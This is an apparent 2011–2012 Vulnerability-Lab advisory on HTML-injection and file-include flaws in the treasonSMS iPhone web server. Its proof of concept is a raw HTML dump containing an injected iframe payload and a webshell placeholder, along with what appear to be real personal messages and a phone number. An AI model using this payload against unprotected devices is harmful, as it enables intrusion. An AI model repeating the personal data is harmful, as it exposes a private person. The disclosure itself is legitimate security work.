Title:
======
IPhone TreasonSMS - HTML Inject & File Include Vulnerability


Date:
=====
2012-04-23


References:
===========
http://www.vulnerability-lab.com/get_content.php?id=154


VL-ID:
=====
154


Introduction:
=============
treasonSMS allows you to send SMS from your desktop computer. It turns your iPhone into a SMS webserver, so you can send 
sms and reply to SMS from your computer over wifi. Confirmed working with FF 3.5, Safari and IE8.

(Copy of the Vendor Homepage: http://code.google.com/p/treasonsms/)


Abstract:
=========
Vulnerability-Lab Team discovered multiple remote Web Vulnerabilities on treasonSMS Webserver for IPhone.


Report-Timeline:
================
2011-04-23:	Public or Non-Public Disclosure


Status:
========
Published


Exploitation-Technique:
=======================
Remote


Severity:
=========
High


Details:
========
A HTML Inject & a File Include vulnerabilit is detected on TreasonSMS IPhone application. The vulnerability allows an 
remote attacker to include malicious persistent script codes on application-side of the iphone. This possible way allows the
attacker also to inject for example webshell scripts to get control of the affected application folder. When the IPhone is 
jailbreaked the vulnerability exploitation can also result full controll of the affected IPhone. The Bug is located in the 
input fields of the Message Sending & Message Output.  An attacker can scan the victim on walkthrough because the ip 
of the webserver makes the treasonSMS available to anybody without password.
To exploit somebody on a walkthourgh its only required to scan for the stable ip via wlan and access the panel for exploitation.

Vulnerable Module(s):
			[+] Send Messages, Kontakte & List Messages

Affected Version(s):
			[+] treasonSMS-1.0.8-src 
			[+] treasonSMS-1.0.8-deb

Picture(s):
			../1.jpg
			../treasonSMS-fileload_malware.png
			../treasonSMS-mozilla_exploitation.png
			../treasonSMS-Safari_exploitation1.png
			../treasonSMS-Safari_exploitation2.jpg


Proof of Concept:
=================
The vulnerability can be exploited by remote attackers. For demonstration or reproduce ...

<div id="curmessage"><span class="msgOut"><div class="msgSender">2010-12-28 18:49:22</div><div style="background: url("GreenTopLeft.gif") 
no-repeat scroll left top transparent;" class="msgContainer"><div style="background: url("GreenTopRight.gif") no-repeat scroll right top 
transparent;" class="msgTopRight"></div><div style="background: url("GreenTop.gif") repeat-x scroll left top transparent;" class="msgTop">
</div><div class="msg">Wir sind schon los, zuspatkommen macht keinen guten Eindruck.<div style="background: url("GreenMiddle.gif") repeat 
scroll left top transparent;" class="msgMiddle"></div><div style="background: url("GreenLeft.gif") repeat-y scroll left top transparent;" 

class="msgLeft"></div><div style="background: url("GreenRight.gif") repeat-y scroll right top transparent;" class="msgRight"></div></div>
<div style="background: url("GreenBottom.gif") repeat-x scroll left bottom transparent;" class="msgBottom"></div><div style="background: 
url("GreenBottomLeft.gif") no-repeat scroll left bottom transparent;" class="msgBottomLeft"></div><div style="background: url

("GreenBottomRightArrow.gif") no-repeat scroll right bottom transparent;" class="msgBottomRightSpeaking"></div></div></span><br clear="all">
<span class="msgOut"><div class="msgSender">2011-01-31 17:48:05</div><div style="background: url("GreenTopLeft.gif") no-repeat scroll left 
top transparent;" class="msgContainer"><div style="background: url("GreenTopRight.gif") no-repeat scroll right top transparent;" 

class="msgTopRight"></div><div style="background: url("GreenTop.gif") repeat-x scroll left top transparent;" class="msgTop"></div><div 
class="msg">+49 176 56253349<div style="background: url("GreenMiddle.gif") repeat scroll left top transparent;" class="msgMiddle"></div><div 

style="background: url("GreenLeft.gif") repeat-y scroll left top transparent;" class="msgLeft"></div><div style="background: url("
GreenRight.gif") repeat-y scroll right top transparent;" class="msgRight"></div></div><div style="background: url("GreenBottom.gif") 
repeat-x scroll left bottom transparent;" class="msgBottom"></div><div style="background: url("GreenBottomLeft.gif") no-repeat scroll left 
bottom transparent;" class="msgBottomLeft"></div><div style="background: url("GreenBottomRightArrow.gif") no-repeat scroll right bottom 
transparent;" class="msgBottomRightSpeaking"></div></div></span><br clear="all"><span class="msgOut"><div class="msgSender">2011-02-11 23:16:15</div><div 

style="background: url("GreenTopLeft.gif") no-repeat scroll left top transparent;" class="msgContainer"><div style="background: url

("GreenTopRight.gif") no-repeat scroll right top transparent;" class="msgTopRight"></div><div style="background: url("GreenTop.gif") 
repeat-x scroll left top transparent;" class="msgTop"></div><div class="msg">Bin jetzt mit dem Minicar unterwegs zum MT..sonst wird das so spät.<div 
style="background: url("GreenMiddle.gif") repeat scroll left top transparent;" class="msgMiddle"></div><div style="background: url
("GreenLeft.gif") repeat-y scroll left top transparent;" class="msgLeft"></div><div style="background: url("GreenRight.gif") 
repeat-y scroll right top transparent;" class="msgRight"></div></div><div style="background: url("GreenBottom.gif") repeat-x scroll left 
bottom transparent;" class="msgBottom"></div><div style="background: url("GreenBottomLeft.gif") no-repeat scroll left bottom transparent;" 

class="msgBottomLeft"></div><div style="background: url("GreenBottomRightArrow.gif") no-repeat scroll right bottom transparent;" 

class="msgBottomRightSpeaking"></div></div></span>&#8203;&#8203;&#8203;&#8203;&#8203;<br clear="all"><span class="msgOut"><div class="msgSender">2011-02-13 00:50:57</div><div style="background: 
url("GreenTopLeft.gif") no-repeat scroll left top transparent;" class="msgContainer"><div style="background: url("GreenTopRight.gif") 
no-repeat scroll right top transparent;" class="msgTopRight"></div><div style="background: url("GreenTop.gif") repeat-x scroll left top 
transparent;" class="msgTop"></div><div class="msg">>"<iframe src="http://www.global-evolution.info" height="600" width="600"><div 

class='msgMiddle'></div><div class='msgLeft'></div><div class='msgRight'></div></div><div 

class='msgBottom'></div><div class='msgBottomLeft'></div><div class='msgBottomRightSpeaking'></div></div></
span><br clear='all'><span class='msgOut'><div class='msgSender'>2011-02-13 00:52:34</div><div class='msgContainer'>
<div class='msgTopRight'></div><div class='msgTop'></div><div class='msg'>>"<<== INCLUDE SCRIPTCODE;Webshell+SAFARI 
EXPLOIT HERE!><div class='msgMiddle'></div><div class='msgLeft'></div><div class='msgRight'></div></div><
div class='msgBottom'></div><div class='msgBottomLeft'></div><div class='msgBottomRightSpeaking'></div></div>&
lt;/span><br clear='all'></iframe></div>&#8203;&#8203;&#8203;&#8203;&#8203;</div></span></div>


Risk:
=====
The security risk of the  web vulnerabilities are estimated as high(+).


Credits:
========
Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (Rem0ve)


Disclaimer:
===========
The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties, 
either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-
Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business 
profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some 
states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation 
may not apply. Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability-
Lab. Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of 
other media, are reserved by Vulnerability-Lab or its suppliers.

    						Copyright © 2011 Vulnerability-Lab

-- 
VULNERABILITY RESEARCH LABORATORY TEAM
Website: www.vulnerability-lab.com
Mail: research@vulnerability-lab.com

